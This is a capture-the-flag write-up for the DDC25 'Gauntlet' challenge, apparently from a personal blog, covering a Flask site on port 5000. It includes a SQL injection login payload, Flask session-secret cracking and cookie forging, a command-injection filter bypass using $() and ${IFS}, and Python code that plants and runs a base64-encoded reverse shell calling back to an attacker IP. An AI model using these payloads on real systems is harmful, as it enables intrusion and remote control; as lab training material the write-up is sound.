---
title: The Gauntlet Pt. 1
date: 2025-03-16 00:00 +/-TTTT
categories: [CTF Writeups, DDC25]
tags: [DDC, Boot2Root, Web Exploitation] 
media_subpath: /assets/img/TheGauntlet
---

## 🗒️ Challenge description 
>So, you think you're a l33t h4xx0r? Alright, here's my little gauntlet to you then: Break in through the website and get a shell one way or another. Once that's done, escalate your privileges and own the box. You won't be needing any fancy kernel exploits or such, this one's all about bad practices and misconfigurations. Doesn't sound too hard, now does it? Good luck!

>Flag binaries are located at /home/*****/user.flag and /root/root.flag

> the-gauntlet.hkn

## 😎 Writeup

Visiting the website in the browser yields connection refused, which means the website is not running on the default port 80. Running a port scan reveals that the website is running on port 5000.

```bash
nmap -p- -sV -sC -T4 the-gauntlet.hkn
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.7.3)
```

Navigating to the website, we see a simple login page. Trying to login with the character `'` in the username field gives us an error message. This indicates that the website may be vulnerable to SQL injection.

Attempting to login with the very common SQL payload `' or 1=1 --` in the username field logs us in as the `Bob` user.

There is an admin page, but our user Bob is not an admin.
Attempting to login with an admin username yields no results.

Our session cookie looks a lot like a JTW, but knowing that the server is liekly running Flask (From the Werkzeug httpd version), it's likely a Flask session cookie.

We can use the `flask-unsign` tool to decode the cookie and see what's inside.

```bash
$ flask-unsign --cookie "eyJ1c2VyIjp7ImlzX2FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiJCb2IifX0.Z9dRAQ.VMZ6dtW1yBAULzog_qaILJCn8jc" --decode
$ {'user': {'is_admin': False, 'username': 'Bob'}}
```

The user Bob is clearly not admin. We can't just change the flask session cookie directly, because it is signed with a secret key. However, we can attempt to crack the secret key using a wordlist, such as the well-known `rockyou.txt`.

```bash
$ flask-unsign --cookie "eyJ1c2VyIjp7ImlzX2FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiJCb2IifX0.Z9dRAQ.VMZ6dtW1yBAULzog_qaILJCn8jc" --unsign --wordlist ~/Downloads/rockyou.txt --no-literal-eval
[*] Session decodes to: {'user': {'is_admin': False, 'username': 'Bob'}}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 11264 attempts
b'itsasecret'
```

We got it! The secret is `itsasecret`. Now we can craft our own session cookie and sign it with the secret key.

```bash
$ flask-unsign --secret itsasecret -s --cookie "{'user': {'is_admin': False, 'username': 'Bob'}}"
eyJ1c2VyIjp7ImlzX2FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiJCb2IifX0.Z9dTQQ.6nlu0kizN9TCtjct7R6GVti_1Z8
```

Now we can change the session cookie in our browser to the crafted one and refresh the page. We are now logged in as the admin user.
The admin page contains a ping tool that allows us to ping an IP address. This may be vulnerable to command injection. Attempting to ping the address `127.0.0.1 & whoami` could give us the current user. However, upon trying this we get an error message: `Illegal characters detected`.

Upon further trial and error, we find that `&`, `|`, `;`, and `&&` are all blocked. Even all whitespaces are blocked. This makes it incredibly difficult to perform command injection. But not impossible...

We can use the `$(command)` syntax to execute commands. This syntax is not blocked by the filter. We can use this to execute the command `$(whoami)`, which gives us `user1` in the output, awesome! We have (cursed) command injecion! 🎉

Now we just need to somehow create a reverse shell. But looking at [revshells.com](https://www.revshells.com/), we see that all the reverse shells require the use of illegal characters. The biggest problem is the lack of spaces. But there is a shell trick that allows us to bypass this limitation: the `IFS` variable. Typing `${IFS}` is equivalent to typing a space. 

Create a reverse shell is still very tricky with the limited characters we have. We can potentially use a python reverse shell, and encode it in base64 to avoid using illegal characters. We can then decode the base64 on the server side.

```python
BASE_URL = 'http://10.42.4.137:5000'
OUR_IP = '10.0.240.251'
PORT = 4242
python_payload = 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + OUR_IP + '",' + str(PORT) + '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

s = requests.Session()
s.cookies['session'] = 'eyJ1c2VyIjp7ImlzX2FkbWluIjp0cnVlLCJ1c2VybmFtZSI6IkJvYiJ9fQ.Z7pi7A.i2nPlzBdXCYgAivTzHxXx8pdxTg'

s.post(BASE_URL + "/admin", data={"command": "$(echo${IFS}'" + base64.b64encode(python_payload.encode()).decode() + "'>base64_payload.txt)"})
```

This will create a file `base64_payload.txt` on the server with the base64 encoded python payload. We can then decode this payload using on the server.

```python
s.post(BASE_URL + "/admin", data={"command": "$(base64${IFS}-d${IFS}base64_payload.txt>shell.py)"})
```

This will create a file `shell.py` on the server with the decoded python payload. Now lets listen for the reverse shell.

```bash
nc -l 4242
```

Finally, we can execute the python payload to get a reverse shell.

```python
s.post(BASE_URL + "/admin", data={"command": "$(python${IFS}shell.py)"})
```

We now have a reverse shell as the user `user1`. We can find the user flag at `/home/user1/user.flag`.

```bash
$ ./home/user1/user.flag
$ Press enter within 3 seconds:
$ DDC{n0th1ng_l1k3_4_b1t_0f_RCE}
```

And that's our flag! 🚩

## 🤓 TL;DR
1. Found Flask website running on port 5000
2. Used SQL injection (`' or 1=1 --`) to login as Bob
3. Cracked session cookie secret key with flask-unsign (`itsasecret`)
4. Forged admin cookie to access admin panel
5. Bypassed command injection filter with `$()` and `${IFS}`
6. Created base64-encoded Python reverse shell
7. Got reverse shell and flag: `DDC{n0th1ng_l1k3_4_b1t_0f_RCE}`